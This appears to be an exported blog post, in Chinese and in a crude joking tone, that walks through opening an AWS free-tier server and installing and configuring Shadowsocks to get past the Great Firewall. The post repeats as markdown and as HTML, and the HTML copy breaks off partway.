\n\n为什么推荐东京呢，显然不应该是因为东京的各位老师才选择的，因为东京的节点在物理上离我们国家比较近，能为我们提供较低的延迟，这点在「ssh」（可以理解为远程对我们服务器发送指令进行操作的一种方式）我们的服务器时感受明显，我身边朋友是美国节点，「ssh」远程连接时，终端中打字延迟感明显，很难受。  \n当然只是相对来说，比较推荐东京，其他节点也是可以选择的。\n\n接下来就是中规中矩的创建流程了。  \n![aws_service](/Image/aws_service.png)\n\n![aws_qidong](/Image/aws_qidong.png)\n\n接下来选择 Amazon 的系统影像\n这里选择，Amazon Linux AMI、RedHat、Ubuntu都行。我这边选择的是Ubuntu。 \n下面就是选择实例的类型了，也就是选择你的服务器型号，因为我们是抱着不花钱的打算来的，所以我们这里选择 「t2.micro」,注意一下它下面标着「符合条件的免费套餐」。\n\n接下来的步骤暂时不需要配，我们直接点击右下角含有启动字样的蓝色按钮结束这个流程就好。\n\n接着有一点需要注意一下，提示你创建秘钥对时，一定要下载下来保存好，多备份几个地方，没有这个东西，你就没办法连接你的服务器了。\n\n接下来提示你正在启动，并提示你创建账单警告，点进去创建一下，凭借从小锻炼的阅读理解能力进行勾选.\n\n再下一步就是连接我们服务器了，找到自己的实例如果没有启动的话点击启动，然后在上面右键连接我们的服务器。\n![aws_connect](/Image/aws_connect.jpg)\n\n连接操作官方文档很详细，可以根据你的系统型号进行选择这里不详细讲了，大家去看文档吧。[链接文档](https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/AccessingInstances.html?icmpid=docs_ec2_console)  \n### 安装 shadowsocks\n接下来就不要自信一波了，老老实实的跟着步骤来吧，免得踩坑。\n下面的「#」代表是我写的注释，不用在终端中输入，不带「#」的就照着样子在终端中敲出来后按回车，然后等结果，如果报错了的话，可以先留言，等不及自己去查一波也是可以的～\n```\n# 获取root权限\nsudo -s\n\n# 更新apt-get\napt-get update\n\n# 安装 python 的 包管理工具 pip\napt-get install python-pip\n\n# 安装shadowsocks\npip install shadowsocks\n```\n### 创建 shadowsocks 的配置文件\n我们安装好以后需要自己创建一下我们的配置文件，启动的时候再指定这个配置文件就可以了。\n配置文件的位置可以自由选择，不过建议放在`/etc/shadowsocks/`下面,这个目录还没有，我们要创建一下。\n```\n# 创建 shadowsocks 目录\nmkdir /etc/shadowsocks\n```\n接下来我们把配置文件的内容写好。\n```\n# 创建并编辑我们的配置文件 \nvim /etc/shadowsocks/config.json\n```\n如果有没使用过`vim`的小伙伴不用担心。  \n我们使用`vim`命令进入编辑模式以后，确定自己的键盘输入法为英文大小写切换为小写。  \n按下`i`键，观察左下方是否出现`INSERT`字样，如果有，证明我们进入了编辑模式。  \n接下来我们图省事的话可以把我下面(的代码)直接复制粘贴进去。粘贴的姿势有的是右键就可以粘贴，有的是右键菜单中有粘贴，大家自己研究，如果不行那就只能手动敲进去了。我写的注释记得要删掉哦。\n如果是手动敲进去，注意请保持自己的输入法维持在英文状态。  \n写好以后按`esc`键，再按下`:`键，左下角出现`:`字样，然后输入`wq`,这两个字母分别对应保存和退出，然后回车就ok了。\n```\n{\n# 配置服务器 ip，这里填写 0.0.0.0\n\"server\":\"0.0.0.0\",\n# 配置端口号及各自的密码\n# 这里我用的多用户配置，大家也可以采用单用户配置\n# 端口号如果不懂可以选择跟我相同的，密码修改为自己想设置的密码就好\n\"port_password\":{\n     \"20610\":\"MII**********QEA\"\n     },\n# 超时时间 这个不用修改\n\"timeout\":300,\n# 加密算法\n\"method\":\"aes-256-cfb\",\n# true 或者 false 开启后能降低延迟\n\"fast_open\":false\n}\n```\n关于上面的 `fast_open` 感兴趣的可以来这里看[TCP-Fast-Open](https://github.com/shadowsocks/shadowsocks/wiki/TCP-Fast-Open) 我们继续。\n### 启动 shadowsocks\n```\n# 启动\nssserver -c /etc/shadowsocks/config.json -d start\n# 停止\nssserver -c /etc/shadowsocks/config.json -d stop\n# 重新启动\nssserver -c /etc/shadowsocks/config.json -d restart\n```\n我们这里使用启动命令启动一下试试。\n如果启动后不确定自己是否成功，可以使用\n```\nps -aux | grep ssserver\n```\n`ps`是 linux 查看系统进程的工具，感兴趣可以看看这个命令：[ps命令](http://man.linuxde.net/ps)  \n如果像下图一样能查到相关结果，证明这个进程已经启动成功了。  \n![aws_cmd_ps](/Image/aws_cmd_ps.jpg)  \n我们接下来把 shadowsocks 服务端进程设置为开机启动：\n```\nvim /etc/rc.local\n```\n按`i`进入`Insert`模式，在`exit 0`上面的空白行加入：\n```\nsudo ssserver -c /etc/shadowsocks/config.json -d start\n```\n然后`esc`接着`:`接着`wq`\n\n然后我们可以去控制台右键我们的实例重启一下，再通过之前连接服务器的姿势连进去检查一下我们的`ssserver`进程是否在运行。\n\n光配置了还不够，aws 还不允许正常访问我们刚刚配置的端口，我们回到 aws 的 web 控制台。\n配置好我们的出入站规则：  \n![aws_secure](/Image/aws_secure.jpg)\n\n`端口范围`这里填上我们前面设置的端口，如果是多用户配置需要把设置的端口都添加进去。因为我配置的是多用户，所以端口就开放的我使用的端口，单用户直接开放对应端口就好。\n`来源`下拉框中选择“任何位置”。\n\n到这里，我们服务器端的操作就结束了。\n\n### 客户端\n客户端相对简单了很多\n来这里下载自己操作系统的客户端：[shadowsocks 客户端](http://shadowsocks.org/en/download/clients.html)  \n下载好以后，配置一下，mac 和 windows 下大同小异，以 mac 的客户端作为讲解：  \n![aws_ss_client](/Image/aws_ss_client.jpg)  \n\n其中的`地址`填写的为 aws 控制台中 ipv4 字段中的 ip：\n![aws_ip_config](/Image/aws_ip_config.jpg)\n端口号呢，就是你`config.json`文件中配置的端口号，密码也是你配置的密码，加密方式也选择配置文件中配置的那个。  \n关于我们客户端的使用，平时用自动代理就好了，如果访问不了，就切全局，简单粗暴。\n![aws_ss_client_config](/Image/aws_ss_client_config.jpg)\n为了防止流量超出或者此悲剧发生，需要设置账单警报。  \n还有，到期前把你账户下所有AWS实例关闭并销毁，如果使用了 ebs， ebs 也要记得释放，都是辛酸泪...\n\n好了，裤腰带解开这么半天，左手的纸巾准备好，音量自觉调低，我们准备出发～。\n本次列车途经 ~~「www.google.com」~~「w\\*w.s\\*x.c\\*m」「w\\*w.pr\\*nh\\*b.com」还没有上车的旅客请抓紧时间上车。\n![xingfu](/Image/xingfu.jpg)","source":"_posts/AWS_SS_Hello_World.md","raw":"---\ntitle: 「从入门到入狱系列」 - AWS+SS 0成本徒手翻墙\ndate: 2017-08-26\nlayout: post\ncomments: true\nreward: true\ntags:\n    - 从入门到入狱\n    - 工具\n---\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=1077483&auto=0&height=66\"></iframe>   \n\n## 开篇日常BB \n前几天写了个「从入门到入狱系列」的文章，介绍了 xssgame 的通关经验，心里美滋滋。 \n\n分享出来后，萌新 DaLao 们纷纷表示「这他妈根本打不开，看他妈的棒棒鸡」\n难道求学的欲望没有让你的内心躁动不安吗。  \n![askwiki](/Image/askwiki.jpg)  \n<!--more-->\n话说这一切的起因，要从古老的**「GFW(Great Firewall)」**说起。\n那是一个……  自！己！去！查！ \n![xiangbudaoba](/Image/xiangbudaoba.jpg)\n好，我们终于费劲笔墨终于把 GFW 讲完了，接下来我们说说：翻墙干嘛。\n自！己！去！…… 还是说两句吧，要被打。\n起初呢，是因为听说「w\\*w.s\\*x.c\\*m」「w\\*w.pr\\*nh\\*b.com」这些网站有一些「不可描述的东西」，后来呢，就出不来了……\n![laosiji](/Image/laosiji.jpg)\n\n## 关于免费与付费的 vpn\n**说来真是惭愧，人类始终对于繁衍后代有着执着且坚定的信念。「墙挡上了不让看？墙在哪呢？把墙扒了，我要看人儿！」**\n萌新在日常生活中也会因为各种各样的原因接触到「翻墙」这个词汇，有点行动力的小伙伴可能会下载各种免费 vpn 软件来排解内心的寂寞。\n但是呢，免费 vpn 的坑实在是太多了，萌新还是记住一点，天下没有免费的早餐、午餐、晚餐还有夜宵。\n```\n┓┏┓┏┓┃\n┛┗┛┗┛┃＼○／\n┓┏┓┏┓┃  /      STOP\n┛┗┛┗┛┃ノ)\n┓┏┓┏┓┃         USE\n┛┗┛┗┛┃ \n┓┏┓┏┓┃         FREE\n┛┗┛┗┛┃ \n┓┏┓┏┓┃         VPN\n┃┃┃┃┃┃\n```\n这是余弦 DaLao 曾经发过的很经典的一个……一个……这叫啥？算了，就那么个玩意。\n\n那对萌新来讲，不使用「free vpn」应该换成哪些姿势呢。首先想到的可能是「付费 vpn」，付费的其实也一样有风险。  \n我们使用 vpn 时是把网络请求发给一个中间人，中间人帮你去请求，请求完以后再把得到的回复发给你。  \n这个过程中，你的风险成本是不随着「付费」和「免费」的转换而有所降低或上升的。 \n只能说付费的可能收了钱会相对的良心一点，但是我们不能把良心当作理所应当，你觉得呢。\n\n## AWS+SS 的姿势\n前面说到付费与免费都会在服务商的胯下颤抖  \n![buranlie](/Image/burranlie.jpg)\n那我们就自己搭建一个自己的梯子啊～\n自己搭建服务时选择服务器要满足几个条件：  \n>1.有一台属于我们自己的服务器。  \n2.服务器要有「公网 ip」便于我们去访问服务器。  \n3.服务器要能正常访问诸如~~「www.google.com」~~「w\\*w.s\\*x.c\\*m」「w\\*w.pr\\*nh\\*b.com」这些网站。  \n4.最好不花钱～\n\n然后我们发现「亚马逊AWS(Amazon Web Services) 云服务」很适合我们:  \n>1.给你一台属于你的服务器。  \n2.给你分配一个「公网 ip」  \n3.有很多海外服务器可供选择，海外服务器不受 GFW 的限制可以访问「不可描述的网站」。  \n4.免费一年～  \n\n![memeda](/Image/memeda.jpg)  \n当然，美中不足就是每个月15G的流量限制，超出要\u001d花钱 QAQ。\n\n有了服务器以后呢，我们需要在上面跑一个24小时供你使用的翻墙程序「shadowsocks 服务端」。  \n有了服务器上随时待命的程序以后，我们只需要在本地安装一个相应的客户端软件与服务端链接，然后就能顺利通过你自己的服务器访问「不可描述的网站」了。  \n绿色环保无虫害，重点是除了你，没人知道你在看些奇怪的东西。\n\n## 可能是最不正经的教程\n![aws_welcome](/Image/aws_welcome.jpg)\n### 注册\n其实呢，按照你的生物本能去注册就可以……\n这里需要准备一张信用卡，可能会收到「预授权」费用1美刀消费的提示，先别慌，去查查这个「预授权」的交易类型是什么意思让自己放个心。  \n其中有一个身份认证环节，要填写手机号，会有电话打过来要你给出页面中的 pin 码，你可以在手机输入或者一个数字一个数字的读给他听(用英语)，听说好多输入的都有问题，那我这边建议读吧。如果出现点击「Call Me Now」按钮上方会提示你错误，让你联系他们的情况，就点进去提交 `case`，说明好自己的问题：\n![aws_case](/Image/aws_case.jpg)  \n下面选择 `phone` 或者 `chat`。\n客服人员会联系你，不论 `phone` 还是 `chat` 都是英语哦～听不懂的话不用慌，对付对付以后你的邮箱会收到邮件，点击链接进入以后发现这一步已经通过了。\n\n顺利通过注册后，我们点击这个 EC2 进行创建。  \n![aws_ec2](/Image/aws_ec2.png)\n\n接着如果出现如下情况，就等几个小时后再来试试，最多不超过24小时。  \n![aws_wait](/Image/aws_wait.png)\n\n### 创建\n创建的时候呢注意左上角要选择推荐选择东京节点  \n![aws_jiedian](/Image/aws_jiedian.jpg)  \n\n为什么推荐东京呢，显然不应该是因为东京的各位老师才选择的，因为东京的节点在物理上离我们国家比较近，能为我们提供较低的延迟，这点在「ssh」（可以理解为远程对我们服务器发送指令进行操作的一种方式）我们的服务器时感受明显，我身边朋友是美国节点，「ssh」远程连接时，终端中打字延迟感明显，很难受。  \n当然只是相对来说，比较推荐东京，其他节点也是可以选择的。\n\n接下来就是中规中矩的创建流程了。  \n![aws_service](/Image/aws_service.png)\n\n![aws_qidong](/Image/aws_qidong.png)\n\n接下来选择 Amazon 的系统影像\n这里选择，Amazon Linux AMI、RedHat、Ubuntu都行。我这边选择的是Ubuntu。 \n下面就是选择实例的类型了，也就是选择你的服务器型号，因为我们是抱着不花钱的打算来的，所以我们这里选择 「t2.micro」,注意一下它下面标着「符合条件的免费套餐」。\n\n接下来的步骤暂时不需要配，我们直接点击右下角含有启动字样的蓝色按钮结束这个流程就好。\n\n接着有一点需要注意一下，提示你创建秘钥对时，一定要下载下来保存好，多备份几个地方，没有这个东西，你就没办法连接你的服务器了。\n\n接下来提示你正在启动，并提示你创建账单警告，点进去创建一下，凭借从小锻炼的阅读理解能力进行勾选.\n\n再下一步就是连接我们服务器了，找到自己的实例如果没有启动的话点击启动，然后在上面右键连接我们的服务器。\n![aws_connect](/Image/aws_connect.jpg)\n\n连接操作官方文档很详细，可以根据你的系统型号进行选择这里不详细讲了，大家去看文档吧。[链接文档](https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/AccessingInstances.html?icmpid=docs_ec2_console)  \n### 安装 shadowsocks\n接下来就不要自信一波了，老老实实的跟着步骤来吧，免得踩坑。\n下面的「#」代表是我写的注释，不用在终端中输入，不带「#」的就照着样子在终端中敲出来后按回车，然后等结果，如果报错了的话，可以先留言，等不及自己去查一波也是可以的～\n```\n# 获取root权限\nsudo -s\n\n# 更新apt-get\napt-get update\n\n# 安装 python 的 包管理工具 pip\napt-get install python-pip\n\n# 安装shadowsocks\npip install shadowsocks\n```\n### 创建 shadowsocks 的配置文件\n我们安装好以后需要自己创建一下我们的配置文件，启动的时候再指定这个配置文件就可以了。\n配置文件的位置可以自由选择，不过建议放在`/etc/shadowsocks/`下面,这个目录还没有，我们要创建一下。\n```\n# 创建 shadowsocks 目录\nmkdir /etc/shadowsocks\n```\n接下来我们把配置文件的内容写好。\n```\n# 创建并编辑我们的配置文件 \nvim /etc/shadowsocks/config.json\n```\n如果有没使用过`vim`的小伙伴不用担心。  \n我们使用`vim`命令进入编辑模式以后，确定自己的键盘输入法为英文大小写切换为小写。  \n按下`i`键，观察左下方是否出现`INSERT`字样，如果有，证明我们进入了编辑模式。  \n接下来我们图省事的话可以把我下面(的代码)直接复制粘贴进去。粘贴的姿势有的是右键就可以粘贴，有的是右键菜单中有粘贴，大家自己研究，如果不行那就只能手动敲进去了。我写的注释记得要删掉哦。\n如果是手动敲进去，注意请保持自己的输入法维持在英文状态。  \n写好以后按`esc`键，再按下`:`键，左下角出现`:`字样，然后输入`wq`,这两个字母分别对应保存和退出，然后回车就ok了。\n```\n{\n# 配置服务器 ip，这里填写 0.0.0.0\n\"server\":\"0.0.0.0\",\n# 配置端口号及各自的密码\n# 这里我用的多用户配置，大家也可以采用单用户配置\n# 端口号如果不懂可以选择跟我相同的，密码修改为自己想设置的密码就好\n\"port_password\":{\n     \"20610\":\"MII**********QEA\"\n     },\n# 超时时间 这个不用修改\n\"timeout\":300,\n# 加密算法\n\"method\":\"aes-256-cfb\",\n# true 或者 false 开启后能降低延迟\n\"fast_open\":false\n}\n```\n关于上面的 `fast_open` 感兴趣的可以来这里看[TCP-Fast-Open](https://github.com/shadowsocks/shadowsocks/wiki/TCP-Fast-Open) 我们继续。\n### 启动 shadowsocks\n```\n# 启动\nssserver -c /etc/shadowsocks/config.json -d start\n# 停止\nssserver -c /etc/shadowsocks/config.json -d stop\n# 重新启动\nssserver -c /etc/shadowsocks/config.json -d restart\n```\n我们这里使用启动命令启动一下试试。\n如果启动后不确定自己是否成功，可以使用\n```\nps -aux | grep ssserver\n```\n`ps`是 linux 查看系统进程的工具，感兴趣可以看看这个命令：[ps命令](http://man.linuxde.net/ps)  \n如果像下图一样能查到相关结果，证明这个进程已经启动成功了。  \n![aws_cmd_ps](/Image/aws_cmd_ps.jpg)  \n我们接下来把 shadowsocks 服务端进程设置为开机启动：\n```\nvim /etc/rc.local\n```\n按`i`进入`Insert`模式，在`exit 0`上面的空白行加入：\n```\nsudo ssserver -c /etc/shadowsocks/config.json -d start\n```\n然后`esc`接着`:`接着`wq`\n\n然后我们可以去控制台右键我们的实例重启一下，再通过之前连接服务器的姿势连进去检查一下我们的`ssserver`进程是否在运行。\n\n光配置了还不够，aws 还不允许正常访问我们刚刚配置的端口，我们回到 aws 的 web 控制台。\n配置好我们的出入站规则：  \n![aws_secure](/Image/aws_secure.jpg)\n\n`端口范围`这里填上我们前面设置的端口，如果是多用户配置需要把设置的端口都添加进去。因为我配置的是多用户，所以端口就开放的我使用的端口，单用户直接开放对应端口就好。\n`来源`下拉框中选择“任何位置”。\n\n到这里，我们服务器端的操作就结束了。\n\n### 客户端\n客户端相对简单了很多\n来这里下载自己操作系统的客户端：[shadowsocks 客户端](http://shadowsocks.org/en/download/clients.html)  \n下载好以后，配置一下，mac 和 windows 下大同小异，以 mac 的客户端作为讲解：  \n![aws_ss_client](/Image/aws_ss_client.jpg)  \n\n其中的`地址`填写的为 aws 控制台中 ipv4 字段中的 ip：\n![aws_ip_config](/Image/aws_ip_config.jpg)\n端口号呢，就是你`config.json`文件中配置的端口号，密码也是你配置的密码，加密方式也选择配置文件中配置的那个。  \n关于我们客户端的使用，平时用自动代理就好了，如果访问不了，就切全局，简单粗暴。\n![aws_ss_client_config](/Image/aws_ss_client_config.jpg)\n为了防止流量超出或者此悲剧发生，需要设置账单警报。  \n还有，到期前把你账户下所有AWS实例关闭并销毁，如果使用了 ebs， ebs 也要记得释放，都是辛酸泪...\n\n好了，裤腰带解开这么半天，左手的纸巾准备好，音量自觉调低，我们准备出发～。\n本次列车途经 ~~「www.google.com」~~「w\\*w.s\\*x.c\\*m」「w\\*w.pr\\*nh\\*b.com」还没有上车的旅客请抓紧时间上车。\n![xingfu](/Image/xingfu.jpg)","slug":"AWS_SS_Hello_World","published":1,"updated":"2017-09-07T16:50:45.000Z","photos":[],"link":"","_id":"cjh9h0k830002mkwbjyqtdpzi","content":"<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"//music.163.com/outchain/player?type=2&id=1077483&auto=0&height=66\"></iframe>   \n\n<h2 id=\"开篇日常BB\"><a href=\"#开篇日常BB\" class=\"headerlink\" title=\"开篇日常BB\"></a>开篇日常BB</h2><p>前几天写了个「从入门到入狱系列」的文章，介绍了 xssgame 的通关经验，心里美滋滋。 </p>\n<p>分享出来后，萌新 DaLao 们纷纷表示「这他妈根本打不开，看他妈的棒棒鸡」<br>难道求学的欲望没有让你的内心躁动不安吗。<br><img src=\"/Image/askwiki.jpg\" alt=\"askwiki\"><br><a id=\"more\"></a><br>话说这一切的起因，要从古老的<strong>「GFW(Great Firewall)」</strong>说起。<br>那是一个……  自！己！去！查！<br><img src=\"/Image/xiangbudaoba.jpg\" alt=\"xiangbudaoba\"><br>好，我们终于费劲笔墨终于把 GFW 讲完了，接下来我们说说：翻墙干嘛。<br>自！己！去！…… 还是说两句吧，要被打。<br>起初呢，是因为听说「w*w.s*x.c*m」「w*w.pr*nh*b.com」这些网站有一些「不可描述的东西」，后来呢，就出不来了……<br><img src=\"/Image/laosiji.jpg\" alt=\"laosiji\"></p>\n<h2 id=\"关于免费与付费的-vpn\"><a href=\"#关于免费与付费的-vpn\" class=\"headerlink\" title=\"关于免费与付费的 vpn\"></a>关于免费与付费的 vpn</h2><p><strong>说来真是惭愧，人类始终对于繁衍后代有着执着且坚定的信念。「墙挡上了不让看？墙在哪呢？把墙扒了，我要看人儿！」</strong><br>萌新在日常生活中也会因为各种各样的原因接触到「翻墙」这个词汇，有点行动力的小伙伴可能会下载各种免费 vpn 软件来排解内心的寂寞。<br>但是呢，免费 vpn 的坑实在是太多了，萌新还是记住一点，天下没有免费的早餐、午餐、晚餐还有夜宵。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">┓┏┓┏┓┃</div><div class=\"line\">┛┗┛┗┛┃＼○／</div><div class=\"line\">┓┏┓┏┓┃  /      STOP</div><div class=\"line\">┛┗┛┗┛┃ノ)</div><div class=\"line\">┓┏┓┏┓┃         USE</div><div class=\"line\">┛┗┛┗┛┃ </div><div class=\"line\">┓┏┓┏┓┃         FREE</div><div class=\"line\">┛┗┛┗┛┃ </div><div class=\"line\">┓┏┓┏┓┃         VPN</div><div class=\"line\">┃┃┃┃┃┃</div></pre></td></tr></table></figure></p>\n<p>这是余弦 DaLao 曾经发过的很经典的一个……一个……这叫啥？算了，就那么个玩意。</p>\n<p>那对萌新来讲，不使用「free vpn」应该换成哪些姿势呢。首先想到的可能是「付费 vpn」，付费的其实也一样有风险。<br>我们使用 vpn 时是把网络请求发给一个中间人，中间人帮你去请求，请求完以后再把得到的回复发给你。<br>这个过程中，你的风险成本是不随着「付费」和「免费」的转换而有所降低或上升的。<br>只能说付费的可能收了钱会相对的良心一点，但是我们不能把良心当作理所应当，你觉得呢。</p>\n<h2 id=\"AWS-SS-的姿势\"><a href=\"#AWS-SS-的姿势\" class=\"headerlink\" title=\"AWS+SS 的姿势\"></a>AWS+SS 的姿势</h2><p>前面说到付费与免费都会在服务商的胯下颤抖<br><img src=\"/Image/burranlie.jpg\" alt=\"buranlie\"><br>那我们就自己搭建一个自己的梯子啊～<br>自己搭建服务时选择服务器要满足几个条件：  </p>\n<blockquote>\n<p>1.有一台属于我们自己的服务器。<br>2.服务器要有「公网 ip」便于我们去访问服务器。<br>3.服务器要能正常访问诸如<del>「www.google.com」</del>「w*w.s*x.c*m」「w*w.pr*nh*b.com」这些网站。<br>4.最好不花钱～</p>\n</blockquote>\n<p>然后我们发现「亚马逊AWS(Amazon Web Services) 云服务」很适合我们:  </p>\n<blockquote>\n<p>1.给你一台属于你的服务器。<br>2.给你分配一个「公网 ip」<br>3.有很多海外服务器可供选择，海外服务器不受 GFW 的限制可以访问「不可描述的网站」。<br>4.免费一年～  </p>\n</blockquote>\n<p><img src=\"/Image/memeda.jpg\" alt=\"memeda\"><br>当然，美中不足就是每个月15G的流量限制，超出要\u001d花钱 QAQ。</p>\n<p>有了服务器以后呢，我们需要在上面跑一个24小时供你使用的翻墙程序「shadowsocks 服务端」。<br>有了服务器上随时待命的程序以后，我们只需要在本地安装一个相应的客户端软件与服务端链接，然后就能顺利通过你自己的服务器访问「不可描述的网站」了。<br>绿色环保无虫害，重点是除了你，没人知道你在看些奇怪的东西。</p>\n<h2 id=\"可能是最不正经的教程\"><a href=\"#可能是最不正经的教程\" class=\"headerlink\" title=\"可能是最不正经的教程\"></a>可能是最不正经的教程</h2><p><img src=\"/Image/aws_welcome.jpg\" alt=\"aws_welcome\"></p>\n<h3 id=\"注册\"><a href=\"#注册\" class=\"headerlink\" title=\"注册\"></a>注册</h3><p>其实呢，按照你的生物本能去注册就可以……<br>这里需要准备一张信用卡，可能会收到「预授权」费用1美刀消费的提示，先别慌，去查查这个「预授权」的交易类型是什么意思让自己放个心。<br>其中有一个身份认证环节，要填写手机号，会有电话打过来要你给出页面中的 pin 码，你可以在手机输入或者一个数字一个数字的读给他听(用英语)，听说好多输入的都有问题，那我这边建议读吧。如果出现点击「Call Me Now」按钮上方会提示你错误，让你联系他们的情况，就点进去提交 <code>case</code>，说明好自己的问题：<br><img src=\"/Image/aws_case.jpg\" alt=\"aws_case\"><br>下面选择 <code>phone</code> 或者 <code>chat</code>。<br>客服人员会联系你，不论 <code>phone</code> 还是 <code>chat</code> 都是英语哦～听不懂的话不用慌，对付对付以后你的邮箱会收到邮件，点击链接进入以后发现这一步已经通过了。</p>\n<p>顺利通过注册后，我们点击这个 EC2 进行创建。<br><img src=\"/Image/aws_ec2.png\" alt=\"aws_ec2\"></p>\n<p>接着如果出现如下情况，就等几个小时后再来试试，最多不超过24小时。<br><img src=\"/Image/aws_wait.png\" alt=\"aws_wait\"></p>\n<h3 id=\"创建\"><a href=\"#创建\" class=\"headerlink\" title=\"创建\"></a>创建</h3><p>创建的时候呢注意左上角要选择推荐选择东京节点<br><img src=\"/Image/aws_jiedian.jpg\" alt=\"aws_jiedian\">  </p>\n<p>为什么推荐东京呢，显然不应该是因为东京的各位老师才选择的，因为东京的节点在物理上离我们国家比较近，能为我们提供较低的延迟，这点在「ssh」（可以理解为远程对我们服务器发送指令进行操作的一种方式）我们的服务器时感受明显，我身边朋友是美国节点，「ssh」远程连接时，终端中打字延迟感明显，很难受。<br>当然只是相对来说，比较推荐东京，其他节点也是可以选择的。</p>\n<p>接下来就是中规中矩的创建流程了。<br><img src=\"/Image/aws_service.png\" alt=\"aws_service\"></p>\n<p><img src=\"/Image/aws_qidong.png\" alt=\"aws_qidong\"></p>\n<p>接下来选择 Amazon 的系统影像<br>这里选择，Amazon Linux AMI、RedHat、Ubuntu都行。我这边选择的是Ubuntu。<br>下面就是选择实例的类型了，也就是选择你的服务器型号，因为我们是抱着不花钱的打算来的，所以我们这里选择 「t2.micro」,注意一下它下面标着「符合条件的免费套餐」。</p>\n<p>接下来的步骤暂时不需要配，我们直接点击右下角含有启动字样的蓝色按钮结束这个流程就好。</p>\n<p>接着有一点需要注意一下，提示你创建秘钥对时，一定要下载下来保存好，多备份几个地方，没有这个东西，你就没办法连接你的服务器了。</p>\n<p>接下来提示你正在启动，并提示你创建账单警告，点进去创建一下，凭借从小锻炼的阅读理解能力进行勾选.</p>\n<p>再下一步就是连接我们服务器了，找到自己的实例如果没有启动的话点击启动，然后在上面右键连接我们的服务器。<br><img src=\"/Image/aws_connect.jpg\" alt=\"aws_connect\"></p>\n<p>连接操作官方文档很详细，可以根据你的系统型号进行选择这里不详细讲了，大家去看文档吧。<a href=\"https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/AccessingInstances.html?icmpid=docs_ec2_console\" target=\"_blank\" rel=\"external\">链接文档</a>  </p>\n<h3 id=\"安装-shadowsocks\"><a href=\"#安装-shadowsocks\" class=\"headerlink\" title=\"安装 shadowsocks\"></a>安装 shadowsocks</h3><p>接下来就不要自信一波了，老老实实的跟着步骤来吧，免得踩坑。<br>下面的「#」代表是我写的注释，不用在终端中输入，不带「#」的就照着样子在终端中敲出来后按回车，然后等结果，如果报错了的话，可以先留言，等不及自己去查一波也是可以的～<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"># 获取root权限</div><div class=\"line\">sudo -s</div><div class=\"line\"></div><div class=\"line\"># 更新apt-get</div><div class=\"line\">apt-get update</div><div class=\"line\"></div><div class=\"line\"># 安装 python 的 包管理工具 pip</div><div class=\"line\">apt-get install python-pip</div><div class=\"line\"></div><div class=\"line\"># 安装shadowsocks</div><div class=\"line\">pip install shadowsocks</div></pre></td></tr></table></figure></p>\n<h3 id=\"创建-shadowsocks-的配置文件\"><a href=\"#创建-shadowsocks-的配置文件\" class=\"headerlink\" title=\"创建 shadowsocks 的配置文件\"></a>创建 shadowsocks 的配置文件</h3><p>我们安装好以后需要自己创建一下我们的配置文件，启动的时候再指定这个配置文件就可以了。<br>配置文件的位置可以自由选择，不过建议放在<code>/etc/shadowsocks/</code>下面,这个目录还没有，我们要创建一下。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"># 创建 shadowsocks 目录</div><div class=\"line\">mkdir /etc/shadowsocks</div></pre></td></tr></table></figure></p>\n<p>接下来我们把配置文件的内容写好。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"># 创建并编辑我们的配置文件 </div><div class=\"line\">vim /etc/shadowsocks/config.json</div></pre></td></tr></table></figure></p>\n<p>如果有没使用过<code>vim</code>的小伙伴不用担心。<br>我们使用<code>vim</code>命令进入编辑模式以后，确定自己的键盘输入法为英文大小写切换为小写。<br>按下<code>i</code>键，观察左下方是否出现<code>INSERT</code>字样，如果有，证明我们进入了编辑模式。<br>接下来我们图省事的话可以把我下面(的代码)直接复制粘贴进去。粘贴的姿势有的是右键就可以粘贴，有的是右键菜单中有粘贴，大家自己研究，如果不行那就只能手动敲进去了。我写的注释记得要删掉哦。<br>如果是手动敲进去，注意请保持自己的输入法维持在英文状态。<br>写好以后按<code>esc</code>键，再按下<code>:</code>键，左下角出现<code>:</code>字样，然后输入<code>wq</code>,这两个字母分别对应保存和退出，然后回车就ok了。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123;</div><div class=\"line\"># 配置服务器 ip，这里填写 0.0.0.0</div><div class=\"line\">&quot;server&quot;:&quot;0.0.0.0&quot;,</div><div class=\"line\"># 配置端口号及各自的密码</div><div class=\"line\"># 这里我用的多用户配置，大家也可以采用单用户配置</div><div class=\"line\"># 端口号如果不懂可以选择跟我相同的，密码修改为自己想设置的密码就好</div><div class=\"line\">&quot;port_password&quot;:&#123;</div><div class=\"line\">     &quot;20610&quot;:&quot;MII**********QEA&quot;</div><div class=\"line\">     &#125;,</div><div class=\"line\"># 超时时间 这个不用修改</div><div class=\"line\">&quot;timeout&quot;:300,</div><div class=\"line\"># 加密算法</div><div 